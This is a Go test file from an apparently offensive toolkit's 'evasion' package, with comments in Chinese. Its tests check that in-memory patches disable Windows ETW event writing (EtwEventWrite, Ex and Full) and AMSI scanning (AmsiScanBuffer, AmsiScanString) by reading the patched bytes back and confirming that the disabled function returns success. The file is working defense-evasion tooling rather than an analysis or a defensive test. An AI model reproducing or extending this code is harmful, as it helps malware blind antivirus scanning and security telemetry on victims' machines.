//go:build windows

package evasion

import (
	"testing"
	"unsafe"

	"golang.org/x/sys/windows"
)

// TestPatchETWCoversAllExports 覆盖面断言：ntdll 里存在的每个 EtwEventWrite* 入口都必须
// 真的被改到（读回验证）。早期实现只 patch EtwEventWrite，这条测试会直接红。
func TestPatchETWCoversAllExports(t *testing.T) {
	rep, err := PatchETW()
	if err != nil {
		t.Fatalf("PatchETW 失败: %v（%s）", err, rep)
	}
	if len(rep.Patched()) < 3 {
		t.Fatalf("只 patch 到 %v，主流 Windows 上至少应有 EtwEventWrite/Ex/Full 三个", rep.Patched())
	}
	for _, tg := range rep.Targets {
		if tg.Err != nil {
			t.Logf("%s 不可用（该版本没这个导出）: %v", tg.Name, tg.Err)
			continue
		}
		if !VerifyPatch(tg.Addr, patchEtwWrite) {
			t.Errorf("%s @ 0x%x 读回不是 patch 后的字节（写入没生效）", tg.Name, tg.Addr)
		}
	}
	t.Logf("%s", rep)
}

// TestEtwEventWriteReturnsSuccess patch 之后调用必须立刻返回 0，且不碰用户数据。
// 用 0 句柄 + 0 条数据调用：如果 patch 没落在真入口上，这个调用会走进原函数并可能崩，
// 所以这条测试本身就是"地址对不对"的外部证据。
func TestEtwEventWriteReturnsSuccess(t *testing.T) {
	if _, err := PatchETW(); err != nil {
		t.Fatalf("PatchETW 失败: %v", err)
	}
	proc := windows.NewLazySystemDLL("ntdll.dll").NewProc("EtwEventWrite")
	if err := proc.Find(); err != nil {
		t.Fatalf("解析 EtwEventWrite 失败: %v", err)
	}
	var desc [16]byte
	r, _, _ := proc.Call(0, uintptr(unsafe.Pointer(&desc[0])), 0, 0)
	if uint32(r) != 0 {
		t.Fatalf("EtwEventWrite 返回 0x%x，期望 STATUS_SUCCESS(0)", uint32(r))
	}
}

// TestPatchAMSIPatchesBothEntries 两个扫描入口都要覆盖
func TestPatchAMSIPatchesBothEntries(t *testing.T) {
	rep, err := PatchAMSI()
	if err != nil {
		t.Fatalf("PatchAMSI 失败: %v（%s）", err, rep)
	}
	if len(rep.Patched()) != 2 {
		t.Fatalf("只 patch 到 %v，期望 AmsiScanBuffer 与 AmsiScanString 两个", rep.Patched())
	}
	for _, tg := range rep.Targets {
		if !VerifyPatch(tg.Addr, patchAmsi) {
			t.Errorf("%s @ 0x%x 读回不是 patch 后的字节", tg.Name, tg.Addr)
		}
	}
}

// TestPatchReportRecordsFailures 不存在的导出要记账为失败，而不是静默跳过
func TestPatchReportRecordsFailures(t *testing.T) {
	rep, err := patchExports("ntdll.dll", []string{"TshellNoSuchExport", "EtwEventWrite"}, patchEtwWrite, false)
	if err == nil {
		t.Fatal("有失败项时应该返回错误")
	}
	if len(rep.Failed()) != 1 || rep.Failed()[0].Name != "TshellNoSuchExport" {
		t.Fatalf("失败记账不对: %+v", rep.Targets)
	}
	if len(rep.Patched()) != 1 {
		t.Fatalf("成功项记账不对: %+v", rep.Targets)
	}
}
